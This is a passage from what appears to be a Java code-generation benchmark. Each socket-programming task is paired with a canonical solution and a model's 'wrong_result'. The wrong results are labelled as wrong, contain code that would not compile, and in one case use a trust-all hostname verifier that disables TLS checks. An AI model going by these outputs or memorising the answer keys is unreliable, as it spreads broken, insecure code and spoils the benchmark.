boolean responseHeadersRead = false;\n            socket.setSoTimeout(SERVER_CONNECT_TIMEOUT_MILLIS);\n            while ((line = in.readLine()) != null) {\n                if (!statusLineRead) {\n                    String[] tokens = line.split(\"\\\\s+\", 3);\n                    if (tokens.length != 3) {\n                        throw new IOException(\"Unexpected reply from HTTP proxy: \" + line);\n                    }\n                    String httpVersion = tokens[0];\n                    String statusCodeString = tokens[1];\n                    String reason = tokens[2];\n                    if (!httpVersion.startsWith(\"HTTP/1.\")) {\n                        throw new IOException(\"Unsupported HTTP version in HTTP proxy response: \" + line);\n                    }\n                    if (!\"200\".equals(statusCodeString)) {\n                        throw new IOException(\n                                \"HTTP proxy CONNECT failed. Status: \" + statusCodeString + \", reason: \" + reason);\n                    }\n                    statusLineRead = true;\n                    continue;\n                }\n                if (line.length() == 0) {\n                    responseHeadersRead = true;\n                    break;\n                }\n            }\n\n            if (!statusLineRead) {\n                throw new EOFException(\"Empty response from HTTP proxy\");\n            }\n            if (!responseHeadersRead) {\n                throw new EOFException(\"Premature end of stream while reading HTTP proxy response\");\n            }\n\n            success = true;\n            return socket;\n        } finally {\n            if (!success) {\n                socket.close();\n            }\n        }\n    }\n\n    private static void tryEnableSni(SSLSocket socket, String hostname) throws IOException {\n        try {\n            socket.getClass().getMethod(\"setHostname\", String.class).invoke(socket, hostname);\n        } catch (NoSuchMethodException | IllegalAccessException e) {\n            e.printStackTrace();\n        } catch (InvocationTargetException e) {\n            throw new IOException(\"Failed to enable SNI via Reflection API\", e);\n        }\n    }\n\n    private static void tryEnableSessionTickets(SSLSocket socket) throws IOException {\n        try {\n            socket.getClass().getMethod(\"setUseSessionTickets\", boolean.class).invoke(socket, true);\n        } catch (NoSuchMethodException | IllegalAccessException e) {\n            e.printStackTrace();\n        } catch (InvocationTargetException e) {\n            throw new IOException(\"Failed to enable session tickets via Reflection API\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport android.content.Context;\nimport android.net.ConnectivityManager;\nimport android.os.Handler;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class RouterSocketClient {\n    private static final String TAG = \"RouterSocketClient\";\n    private static final int SERVER_CONNECT_TIMEOUT_MILLIS = 20000;\n    private static final int HTTP_PROXY_CONNECT_TIMEOUT_MILLIS = 5000;\n    private static final int TLS_HANDSHAKE_TIMEOUT_MILLIS = 20000;\n    private final Object mLock = new Object();\n    private final ConnectivityManager mConnectivityManager;\n    private final SSLSocketFactory mSSLSocketFactory;\n    private final Context mContext;\n    private final Handler mDelayedRestartHandler;\n    private Socket mSocket;\n    private Thread mThread;\n\n    public RouterSocketClient(Context context, ConnectivityManager connectivityManager, java.util.Random random) {\n        mContext = context;\n        mConnectivityManager = connectivityManager;\n        mSSLSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n        mDelayedRestartHandler = new Handler();\n    }\n\n    public static Socket connectSocket(String host, int port) throws IOException {\n        return connectSocketNoProxy(host, port);\n    }\n\n    public static Socket connectSocketNoProxy(String host, int port) throws IOException {\n        Socket socket = new Socket();\n        socket.connect(new InetSocketAddress(host, port), SERVER_CONNECT_TIMEOUT_MILLIS);\n        return socket;\n    }\n\n    public static Socket connectSocketViaHttpProxyConnectMethod(String host, int port, SocketAddress proxyAddress) throws IOException {\n        Socket proxySocket = new Socket();\n        proxySocket.connect(proxyAddress, HTTP_PROXY_CONNECT_TIMEOUT_MILLIS);\n        proxySocket.setSoTimeout(SERVER_CONNECT_TIMEOUT_MILLIS);\n\n        String request = \"CONNECT \" + host + \":\" + port + \" HTTP/1.1\\r\\n\" +\n                         \"Host: \" + host + \"\\r\\n\" +\n                         \"Proxy-Connection: Keep-Alive\\r\\n\" +\n                         \"\\r\\n\";\n\n        proxySocket.getOutputStream().write(request.getBytes());\n        proxySocket.getOutputStream().flush();\n\n        byte[] buffer = new byte[1024];\n        int bytesRead = proxySocket.getInputStream().read(buffer);\n        String response = new String(buffer, 0, bytesRead);\n\n        if (!response.startsWith(\"HTTP/1.1 200\")) {\n            throw new IOException(\"Proxy connection failed: \" + response);\n        }\n\n        return proxySocket;\n    }\n\n    private void tryEnableSni(SSLSocket socket, String hostname) {\n        if (socket instanceof SSLSocket) {\n            try {\n                socket.setEnabledProtocols(new String[]{\"TLSv1.2\"});\n                socket.setHostnameVerifier((hostname1, session) -> true);\n                socket.setUseClientMode(true);\n                socket.startHandshake();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void tryEnableSessionTickets(SSLSocket socket) {\n        if (socket instanceof SSLSocket) {\n            try {\n                socket.getSession().getLocalCertificates();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 562,
    "Instruction": "Task Description: Implement a Java class that handles sending emails with attachments via SMTP protocol using socket programming.\n\nClass Description: The SendMailJob class provides functionality to connect to an SMTP server, compose and send emails with attachments, and properly handle the email sending process including connection management and error handling.\n\nAttributes:\n- socket: [Socket] - The socket connection to the SMTP server\n- in: [BufferedReader] - Input stream for reading server responses\n- out: [OutputStream] - Output stream for sending commands to the server\n- out64: [Base64OutputStream] - Base64 encoded output stream for sending attachments\n- connectedToMailServer: [boolean] - Flag indicating connection status\n- mailServer: [String] - SMTP server address\n- fromAddress: [String] - Sender's email address\n- boundary: [String] - MIME boundary for multipart messages\n- recipientString: [String] - Comma-separated recipient addresses\n- mailSubject: [String] - Email subject line\n- mailBody: [String] - Email body content\n- errorDialogTitle: [String] - Title for error dialogs\n\nMethods:\n- SendMailJob([ProgressDialog, MainFrame, FileSet, String, String, String]) -> [void] - Constructor that initializes email parameters and configurations\n- openConnection() -> [void] - Establishes connection with SMTP server and initializes streams\n- sendBody() -> [void] - Sends email headers and body content to the server\n- sendAttachment([AbstractFile]) -> [void] - Encodes and sends file attachments to the server\n- closeConnection() -> [void] - Closes all connections and releases resources\n- readWriteLine([String]) -> [void] - Sends a command to server and reads response\n- writeLine([String]) -> [void] - Writes a line to the output stream\n- splitRecipientString([String, List<String>]) -> [String] - Parses recipient string into individual addresses",
    "Canonical_solution": "import com.mucommander.commons.file.AbstractFile;\nimport com.mucommander.commons.io.StreamUtils;\nimport com.mucommander.commons.io.base64.Base64OutputStream;\nimport com.mucommander.conf.MuConfigurations;\nimport com.mucommander.conf.MuPreference;\nimport com.mucommander.conf.MuPreferences;\nimport com.mucommander.job.FileJobState;\nimport com.mucommander.text.Translator;\nimport com.mucommander.ui.dialog.DialogAction;\nimport com.mucommander.ui.dialog.file.ProgressDialog;\nimport com.mucommander.ui.main.MainFrame;\n\nimport java.io.*;\nimport java.net.Socket;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.StringTokenizer;\nimport java.util.Vector;\n\npublic class SendMailJob {\n\n    private Socket socket;\n    private BufferedReader in;\n    private OutputStream out;\n    private Base64OutputStream out64;\n    private boolean connectedToMailServer;\n    private String mailServer;\n    private String fromAddress;\n    private String boundary;\n    private String recipientString;\n    private String mailSubject;\n    private String mailBody;\n    private String errorDialogTitle;\n\n    public SendMailJob(ProgressDialog progressDialog, MainFrame mainFrame, FileSet filesToSend, String recipientString, String mailSubject, String mailBody) {\n        this.boundary = \"mucommander\" + System.currentTimeMillis();\n        this.recipientString = recipientString;\n        this.mailSubject = mailSubject;\n        this.mailBody = mailBody + \"\\n\\n\" + \"Sent by muCommander - http://www.mucommander.com\\n\";\n        this.mailServer = MuConfigurations.getPreferences().getVariable(MuPreference.SMTP_SERVER);\n        this.fromAddress = MuConfigurations.getPreferences().getVariable(MuPreference.MAIL_SENDER_ADDRESS);\n        this.errorDialogTitle = Translator.get(\"email_dialog.error_title\");\n    }\n\n    private void openConnection() throws IOException {\n        this.socket = new Socket(mailServer, MuConfigurations.getPreferences().getVariable(MuPreference.SMTP_PORT, MuPreferences.DEFAULT_SMTP_PORT));\n        this.in = new BufferedReader(new InputStreamReader(socket.getInputStream(), \"UTF-8\"));\n        this.out = socket.getOutputStream();\n        this.out64 = new Base64OutputStream(out, true);\n        this.connectedToMailServer = true;\n    }\n\n    private void sendBody() throws IOException {\n        readWriteLine(\"HELO muCommander\");\n        readWriteLine(\"MAIL FROM: \" + fromAddress);\n\n        List<String> recipients = new Vector<String>();\n        recipientString = splitRecipientString(recipientString, recipients);\n        int nbRecipients = recipients.size();\n        for (int i = 0; i < nbRecipients; i++)\n            readWriteLine(\"RCPT TO: <\" + recipients.get(i) + \">\");\n        readWriteLine(\"DATA\");\n        writeLine(\"MIME-Version: 1.0\");\n        writeLine(\"Subject: \" + this.mailSubject);\n        writeLine(\"From: \" + this.fromName + \" <\" + this.fromAddress + \">\");\n        writeLine(\"To: \" + recipientString);\n        writeLine(\"Content-Type: multipart/mixed; boundary=\\\"\" + boundary + \"\\\"\");\n        writeLine(\"\\r\\n--\" + boundary);\n        writeLine(\"Content-Type: text/plain; charset=\\\"utf-8\\\"\\r\\n\");\n        writeLine(this.mailBody + \"\\r\\n\\r\\n\");\n        writeLine(\"\\r\\n--\" + boundary);\n    }\n\n    private void sendAttachment(AbstractFile file) throws IOException {\n        InputStream fileIn = null;\n        try {\n            String mimeType = MimeTypes.getMimeType(file);\n            if (mimeType == null)\n                mimeType = \"application/octet-stream\";\n            writeLine(\"Content-Type:\" + mimeType + \"; name=\" + file.getName());\n            writeLine(\"Content-Disposition: attachment;filename=\\\"\" + file.getName() + \"\\\"\");\n            writeLine(\"Content-transfer-encoding: base64\\r\\n\");\n            fileIn = setCurrentInputStream(file.getInputStream());\n            StreamUtils.copyStream(fileIn, out64);\n            out64.writePadding();\n            writeLine(\"\\r\\n--\" + boundary);\n        } finally {\n            if (fileIn != null)\n                fileIn.close();\n        }\n    }\n\n    private void closeConnection() {\n        try {\n            socket.close();\n            in.close();\n            out64.close();\n        } catch (Exception e) {\n        }\n    }\n\n    private void readWriteLine(String s) throws IOException {\n        out.write((s + \"\\r\\n\").getBytes(\"UTF-8\"));\n        in.readLine();\n    }\n\n    private void writeLine(String s) throws IOException {\n        out.write((s + \"\\r\\n\").getBytes(\"UTF-8\"));\n    }\n\n    private String splitRecipientString(String recipientsStr, List<String> recipients) {\n        StringBuilder newRecipientsSb = new StringBuilder();\n        StringTokenizer st = new StringTokenizer(recipientsStr, \",;\");\n        String rec;\n        int pos1, pos2;\n        while (st.hasMoreTokens()) {\n            rec = st.nextToken().trim();\n            if ((pos1 = rec.indexOf('<')) != -1 && (pos2 = rec.indexOf('>', pos1 + 1)) != -1)\n                recipients.add(rec.substring(pos1 + 1, pos2));\n            else\n                recipients.add(rec);\n\n            newRecipientsSb.append(rec);\n            if (st.hasMoreTokens())\n                newRecipientsSb.append(\", \");\n        }\n        return newRecipientsSb.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "import java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport javax.mail.internet.MimeUtility;\nimport javax.activation.DataHandler;\nimport javax.activation.DataSource;\nimport javax.activation.FileDataSource;\n\npublic class SendMailJob {\n    private Socket socket;\n    private BufferedReader in;\n    private OutputStream out;\n    private Base64OutputStream out64;\n    private boolean connectedToMailServer;\n    private String mailServer;\n    private String fromAddress;\n    private String boundary;\n    private String recipientString;\n    private String mailSubject;\n    private String mailBody;\n    private String errorDialogTitle;\n\n    public SendMailJob(ProgressDialog progressDialog, MainFrame mainFrame, FileSet fileSet, String mailServer, String fromAddress, String recipientString) {\n        this.mailServer = mailServer;\n        this.fromAddress = fromAddress;\n        this.recipientString = recipientString;\n        this.connectedToMailServer = false;\n        this.boundary = \"----=_Part_\" + System.currentTimeMillis();\n        this.errorDialogTitle = \"Email Sending Error\";\n    }\n\n    public void openConnection() throws IOException {\n        socket = new Socket(mailServer, 25);\n        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        out = socket.getOutputStream();\n        connectedToMailServer = true;\n        readWriteLine(\"HELO\");\n    }\n\n    public void sendBody() throws IOException {\n        writeLine(\"MAIL FROM:<\" + fromAddress + \">\");\n        readWriteLine(\"RCPT TO:<\" + recipientString + \">\");\n        writeLine(\"DATA\");\n        readWriteLine(\"\");\n\n        writeLine(\"From: \" + fromAddress);\n        writeLine(\"To: \" + recipientString);\n        writeLine(\"Subject: \" + mailSubject);\n        writeLine(\"MIME-Version: 1.0\");\n        writeLine(\"Content-Type: multipart/mixed; boundary=\\\"\" + boundary + \"\\\"\");\n\n        writeLine(\"\");\n        writeLine(\"--\" + boundary);\n        writeLine(\"Content-Type: text/plain; charset=\\\"UTF-8\\\"\");\n        writeLine(\"Content-Transfer-Encoding: 7bit\");\n        writeLine(\"\");\n        writeLine(mailBody);\n    }\n\n    public void sendAttachment(AbstractFile file) throws IOException {\n        writeLine(\"--\" + boundary);\n        writeLine(\"Content-Type: application/octet-stream; name=\\\"\" + file.getName() + \"\\\"\");\n        writeLine(\"Content-Transfer-Encoding: base64\");\n        writeLine(\"Content-Disposition: attachment; filename=\\\"\" + file.getName() + \"\\\"\");\n        writeLine(\"\");\n\n        out64 = new Base64OutputStream(out);\n        FileInputStream fis = new FileInputStream(file.getAbsolutePath());\n        byte[] buffer = new byte[4096];\n        int bytesRead;\n        while ((bytesRead = fis.read(buffer)) != -1) {\n            out64.write(buffer, 0, bytesRead);\n        }\n        fis.close();\n        out64.flush();\n        out64.close();\n        writeLine(\"\");\n    }\n\n    public void closeConnection() {\n        try {\n            if (out64 != null) {\n                out64.close();\n            }\n            if (out != null) {\n                out.close();\n            }\n            if (in != null) {\n                in.close();\n            }\n            if (socket != null) {\n                socket.close();\n            }\n            connectedToMailServer = false;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void readWriteLine(String command) throws IOException {\n        writeLine(command);\n        String response = in.readLine();\n        while (response != null && response.length() > 3 && response.charAt(3) == '-') {\n            response = in.readLine();\n        }\n        if (response != null && !response.startsWith(\"250\")) {\n            throw new IOException(\"SMTP server returned error: \" + response);\n        }\n    }\n\n    public void writeLine(String line) throws IOException {\n        out.write((line + \"\\r\\n\").getBytes());\n        out.flush();\n    }\n\n    public String splitRecipientString(String recipientString, List<String> recipients) {\n        String[] addresses = recipientString.split(\",\");\n        for (String address : addresses) {\n            recipients.add(address.trim());\n        }\n        return \"\";\n    }\n}"
  },
  {
    "Task_id": 563,
    "Instruction": "Task Description: Create a Java function that tests a client-server connection using Socket programming, including handling connection events and verifying successful communication.\n\nFunction Description: The function establishes a TCP connection to a server, sends an HTTP GET request, and verifies both connection establishment and message delivery. It uses CountDownLatch for synchronization between the main thread and callback handlers. The function fails if either the connection or message delivery doesn't complete within specified timeouts.\n\nInput: None (uses DefaultServer class for host configuration)\n\nOutput: None (throws exceptions or asserts failures for unsuccessful operations)\n\nKey Operations:\n1. Creates Socket connection to default server\n2. Sets up server event handlers with callbacks\n3. Obtains input/output streams for communication\n4. Sends HTTP GET request\n5. Verifies connection establishment within 10 seconds\n6. Verifies message delivery within 10 seconds\n7. Properly closes resources\n8. Uses synchronization primitives for thread coordination",
    "Canonical_solution": "import java.net.Socket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\n\npublic void testConnectionFail() throws IOException, InterruptedException {\n    final Socket socket = new Socket(DefaultServer.getHostAddress(\"default\"), DefaultServer.getHostPort(\"default\"));\n    final CountDownLatch latch = new CountDownLatch(1);\n    final CountDownLatch connected = new CountDownLatch(1);\n    DefaultServer.setRootHandler(new ServerSentEventHandler(new ServerSentEventConnectionCallback() {\n        @Override\n        public void connected(final ServerSentEventConnection connection, final String lastEventId) {\n            final XnioIoThread thread = (XnioIoThread) Thread.currentThread();\n            connected.countDown();\n            thread.execute(new Runnable() {\n                @Override\n                public void run() {\n                    connection.send(\"hello\", new ServerSentEventConnection.EventCallback() {\n                        @Override\n                        public void done(ServerSentEventConnection connection, String data, String event, String id) {\n                        }\n\n                        @Override\n                        public void failed(ServerSentEventConnection connection, String data, String event, String id, IOException e) {\n                            latch.countDown();\n                        }\n                    });\n                    if(latch.getCount() > 0) {\n                        WorkerUtils.executeAfter(thread, this, 100, TimeUnit.MILLISECONDS);\n                    }\n                }\n            });\n        }\n    }));\n    InputStream in = socket.getInputStream();\n    OutputStream out = socket.getOutputStream();\n    out.write((\"GET / HTTP/1.1\\r\\nHost:\" + DefaultServer.getHostAddress() +\"\\r\\n\\r\\n\").getBytes());\n    out.flush();\n    if(!connected.await(10, TimeUnit.SECONDS)) {\n        Assert.fail();\n    }\n    out.close();\n    in.close();\n    if(!latch.await(10, TimeUnit.SECONDS)) {\n        Assert.fail();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.CountDownLatch;\n\npublic class SocketTest {\n    public static void testConnection() throws Exception {\n        CountDownLatch connectionLatch = new CountDownLatch(1);\n        CountDownLatch messageLatch = new CountDownLatch(1);\n\n        DefaultServer server = new DefaultServer();\n        String host = server.getHost();\n        int port = server.getPort();\n\n        try (Socket socket = new Socket()) {\n            socket.connect(new InetSocketAddress(host, port), 10000);\n            connectionLatch.countDown();\n\n            socket.setSoTimeout(10000);\n\n            OutputStream out = socket.getOutputStream();\n            out.write(\"GET / HTTP/1.1\\r\\nHost: \" + host + \"\\r\\n\\r\\n\".getBytes());\n            out.flush();\n\n            InputStream in = socket.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            StringBuilder response = new StringBuilder();\n\n            while ((bytesRead = in.read(buffer)) != -1) {\n                response.append(new String(buffer, 0, bytesRead));\n            }\n\n            if (response.toString().contains(\"HTTP/1.1 200 OK\")) {\n                messageLatch.countDown();\n            }\n        } catch (Exception e) {\n            throw new RuntimeException(\"Connection or message delivery failed\", e);\n        }\n\n        if (!connectionLatch.await(10, java.util.concurrent.TimeUnit.SECONDS)) {\n            throw new RuntimeException(\"Connection establishment timed out\");\n        }\n\n        if (!messageLatch.await(10, java.util.concurrent.TimeUnit.SECONDS)) {\n            throw new RuntimeException(\"Message delivery timed out\");\n        }\n    }\n\n    static class DefaultServer {\n        private final String host = \"localhost\";\n        private final int port = 8080;\n\n        public String getHost() {\n            return host;\n        }\n\n        public int getPort() {\n            return port;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 564,
    "Instruction": "Task Description: Write a function that tests abnormal request termination behavior in a client-server communication scenario using TCP sockets. The function should simulate sending a malformed HTTP request with incorrect content length and verify proper connection handling.\n\nFunction Description: The function establishes a TCP connection to a server, sends an HTTP POST request with intentionally incorrect Content-Length header, immediately closes the streams, and verifies if the completion listener is called within a timeout period. This tests the server's handling of abruptly terminated requests.\n\nInput: \n- None (uses class-level DefaultServer.getDefaultServerAddress() and completionListenerCalledLatch)\n- Implicit input through class attributes:\n  - DefaultServerAddress: Server endpoint address\n  - completionListenerCalledLatch: CountDownLatch for synchronization\n  - completionListenerCalled: boolean flag to verify listener invocation\n\nOutput: \n- None (void return type)\n- Side effects:\n  - Throws IOException if socket operations fail\n  - Throws InterruptedException if await is interrupted\n  - Asserts completionListenerCalled is true\n  - Closes socket resources in finally block",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\n\npublic void testAbnormalRequestTermination() throws IOException, InterruptedException {\n    Socket socket = new Socket();\n    socket.connect(DefaultServer.getDefaultServerAddress());\n    try {\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < 10000; ++i) {\n            sb.append(\"hello world\\r\\n\");\n        }\n        String request = \"POST / HTTP/1.1\\r\\nHost:localhost\\r\\nContent-Length:\" + sb.length() + 100 + \"\\r\\n\\r\\n\" + sb.toString();\n        OutputStream outputStream = socket.getOutputStream();\n\n        outputStream.write(request.getBytes(\"US-ASCII\"));\n        socket.getInputStream().close();\n        outputStream.close();\n\n        completionListenerCalledLatch.await(5, TimeUnit.SECONDS);\n        Assert.assertTrue(completionListenerCalled);\n    } finally {\n        IoUtils.safeClose(socket);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nvoid testAbnormalRequestTermination() throws IOException, InterruptedException {\n    Socket socket = new Socket();\n    socket.connect(new InetSocketAddress(DefaultServer.getDefaultServerAddress(), 80));\n    OutputStream out = socket.getOutputStream();\n    String request = \"POST / HTTP/1.1\\r\\nContent-Length: 100\\r\\n\\r\\n\";\n    out.write(request.getBytes());\n    out.flush();\n    socket.shutdownOutput();\n    socket.close();\n    completionListenerCalledLatch.await(5, TimeUnit.SECONDS);\n    assertTrue(completionListenerCalled);\n}\n```"
  },
  {
    "Task_id": 566,
    "Instruction": "Task Description: Create a Java class that implements Unix domain socket communication using SocketChannel for inter-process communication on Unix-like systems.\n\nClass Description: The UnixSocket class extends AbstractSocket and provides functionality for Unix domain socket communication. It uses Java's SocketChannel for establishing connections and supports input/output stream operations.\n\nAttributes:\n- socketAddress: [SocketAddress] - The address of the Unix domain socket\n- socketChannel: [SocketChannel] - The channel used for socket communication\n\nMethods:\n- UnixSocket(String path) -> [void] - Constructor that creates a Unix domain socket connection to the specified path. Throws various exceptions if the operation fails.\n- getInputStream() -> [InputStream] - Returns an input stream for reading data from the socket. Throws SocketException if the socket is closed, not connected, or input is shutdown.\n- getOutputStream() -> [OutputStream] - Returns an output stream for writing data to the socket. Throws SocketException if the socket is closed, not connected, or output is shutdown.\n- getLocalSocketAddress() -> [SocketAddress] - Returns the local socket address.\n- getRemoteSocketAddress() -> [SocketAddress] - Returns the remote socket address (same as local for Unix domain sockets).\n- close() -> [void] - Closes the socket channel and releases resources.\n- WrappedWritableByteChannel.write(ByteBuffer src) -> [int] - Inner class method that writes data from the buffer to the socket channel.\n- WrappedWritableByteChannel.isOpen() -> [boolean] - Inner class method that checks if the channel is open.\n- WrappedWritableByteChannel.close() -> [void] - Inner class method that closes the channel.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.lang.reflect.InvocationTargetException;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.SocketException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.Channels;\nimport java.nio.channels.SocketChannel;\nimport java.nio.channels.WritableByteChannel;\n\npublic class UnixSocket extends AbstractSocket {\n\n    private final SocketAddress socketAddress;\n    private final SocketChannel socketChannel;\n\n    public UnixSocket(String path) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException,\n            IllegalAccessException, IOException {\n        Class<?> unixDomainSocketAddress = Class.forName(\"java.net.UnixDomainSocketAddress\");\n        this.socketAddress =\n                (SocketAddress) unixDomainSocketAddress.getMethod(\"of\", String.class)\n                        .invoke(null, path);\n        this.socketChannel = SocketChannel.open(this.socketAddress);\n    }\n\n    @Override\n    public InputStream getInputStream() throws IOException {\n        if (isClosed()) {\n            throw new SocketException(\"Socket is closed\");\n        }\n        if (!isConnected()) {\n            throw new SocketException(\"Socket is not connected\");\n        }\n        if (isInputShutdown()) {\n            throw new SocketException(\"Socket input is shutdown\");\n        }\n        return Channels.newInputStream(socketChannel);\n    }\n\n    @Override\n    public OutputStream getOutputStream() throws IOException {\n        if (isClosed()) {\n            throw new SocketException(\"Socket is closed\");\n        }\n        if (!isConnected()) {\n            throw new SocketException(\"Socket is not connected\");\n        }\n        if (isOutputShutdown()) {\n            throw new SocketException(\"Socket output is shutdown\");\n        }\n        return Channels.newOutputStream(new WrappedWritableByteChannel());\n    }\n\n    @Override\n    public SocketAddress getLocalSocketAddress() {\n        return socketAddress;\n    }\n\n    @Override\n    public SocketAddress getRemoteSocketAddress() {\n        return socketAddress;\n    }\n\n    @Override\n    public void close() throws IOException {\n        super.close();\n        this.socketChannel.close();\n    }\n\n    private class WrappedWritableByteChannel implements WritableByteChannel {\n        @Override\n        public int write(ByteBuffer src) throws IOException {\n            return UnixSocket.this.socketChannel.write(src);\n        }\n\n        @Override\n        public boolean isOpen() {\n            return UnixSocket.this.socketChannel.isOpen();\n        }\n\n        @Override\n        public void close() throws IOException {\n            UnixSocket.this.socketChannel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.SocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\n\npublic class UnixSocket extends AbstractSocket {\n    private final SocketAddress socketAddress;\n    private final SocketChannel socketChannel;\n\n    public UnixSocket(String path) throws Exception {\n        this.socketAddress = new UnixSocketAddress(path);\n        this.socketChannel = SocketChannel.open();\n        this.socketChannel.connect(this.socketAddress);\n    }\n\n    @Override\n    public InputStream getInputStream() throws Exception {\n        if (socketChannel == null || !socketChannel.isOpen()) {\n            throw new java.net.SocketException(\"Socket is closed\");\n        }\n        return new UnixInputStream(socketChannel);\n    }\n\n    @Override\n    public OutputStream getOutputStream() throws Exception {\n        if (socketChannel == null || !socketChannel.isOpen()) {\n            throw new java.net.SocketException(\"Socket is closed\");\n        }\n        return new UnixOutputStream(socketChannel);\n    }\n\n    @Override\n    public SocketAddress getLocalSocketAddress() {\n        return socketAddress;\n    }\n\n    @Override\n    public SocketAddress getRemoteSocketAddress() {\n        return socketAddress;\n    }\n\n    @Override\n    public void close() throws Exception {\n        if (socketChannel != null && socketChannel.isOpen()) {\n            socketChannel.close();\n        }\n    }\n\n    private static class UnixInputStream extends InputStream {\n        private final SocketChannel channel;\n\n        public UnixInputStream(SocketChannel channel) {\n            this.channel = channel;\n        }\n\n        @Override\n        public int read() throws Exception {\n            ByteBuffer buffer = ByteBuffer.allocate(1);\n            int bytesRead = channel.read(buffer);\n            if (bytesRead == -1) {\n                return -1;\n            }\n            return buffer.get(0) & 0xFF;\n        }\n\n        @Override\n        public int read(byte[] b, int off, int len) throws Exception {\n            ByteBuffer buffer = ByteBuffer.wrap(b, off, len);\n            int bytesRead = channel.read(buffer);\n            return bytesRead;\n        }\n\n        @Override\n        public void close() throws Exception {\n            if (channel != null && channel.isOpen()) {\n                channel.close();\n            }\n        }\n    }\n\n    private static class UnixOutputStream extends OutputStream {\n        private final SocketChannel channel;\n\n        public UnixOutputStream(SocketChannel channel) {\n            this.channel = channel;\n        }\n\n        @Override\n        public void write(int b) throws Exception {\n            ByteBuffer buffer = ByteBuffer.allocate(1);\n            buffer.put((byte) b);\n            buffer.flip();\n            channel.write(buffer);\n        }\n\n        @Override\n        public void write(byte[] b, int off, int len) throws Exception {\n            ByteBuffer buffer = ByteBuffer.wrap(b, off, len);\n            channel.write(buffer);\n        }\n\n        @Override\n        public void close() throws Exception {\n            if (channel != null && channel.isOpen()) {\n                channel.close();\n            }\n        }\n    }\n\n    private static class UnixSocketAddress extends SocketAddress {\n        private final String path;\n\n        public UnixSocketAddress(String path) {\n            this.path = path;\n        }\n\n        public String getPath() {\n            return path;\n        }\n    }\n\n    private static class WrappedWritableByteChannel {\n        private final SocketChannel channel;\n\n        public WrappedWritableByteChannel(SocketChannel channel) {\n            this.channel = channel;\n        }\n\n        public int write(ByteBuffer src) throws Exception {\n            return channel.write(src);\n        }\n\n        public boolean isOpen() {\n            return channel.isOpen();\n        }\n\n        public void close() throws Exception {\n            channel.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 567,
    "Instruction": "Task Description: Implement a TCP client class in Java that handles network communication with a server, including connection management, data transmission, and reception with proper error handling and resource management.\n\nClass Description: The TcpClient class establishes and maintains a TCP connection to a specified server, sends data packets, and receives responses. It uses a custom protocol with 8-byte headers (4 bytes for type, 4 bytes for length) followed by the message body. The class runs network operations on a dedicated background thread and provides callback mechanisms for received data.\n\nAttributes:\n- TAG: String - Tag for logging purposes\n- PACKAGE_HEAD_LENGTH: int - Fixed length of packet header (8 bytes)\n- receiveListener: ReceiveListener - Callback interface for received data\n- hostip: String - Server IP address to connect to\n- port: int - Server port number\n- socketClient: Socket - The TCP socket instance\n- handler: Handler - Handler for background thread operations\n- receiveThread: Thread - Thread for receiving data\n\nMethods:\n- TcpClient() -> void - Constructor that initializes the background thread and attempts connection\n- tryConnect() -> void - Internal method to attempt server connection in a loop\n- connect() -> boolean - Establishes socket connection to server (returns success status)\n- send(byte[] data) -> void - Sends data to the server (runs on background thread)\n- onReceive(ReceiveListener receiveListener) -> void - Sets the receive callback listener\n- destroy() -> void - Cleans up resources and stops all network operations\n- closeAll() -> void - Safely closes socket and releases resources\n- startReceive() -> void - Starts the data receiving thread\n- getLengthFromHeadByte(byte[] b) -> int - Extracts message length from header bytes\n- getTypeFromHeadByte(byte[] b) -> int - Extracts message type from header bytes\n\nNested Classes:\n- Receiver implements Runnable - Background thread implementation for continuous data reception",
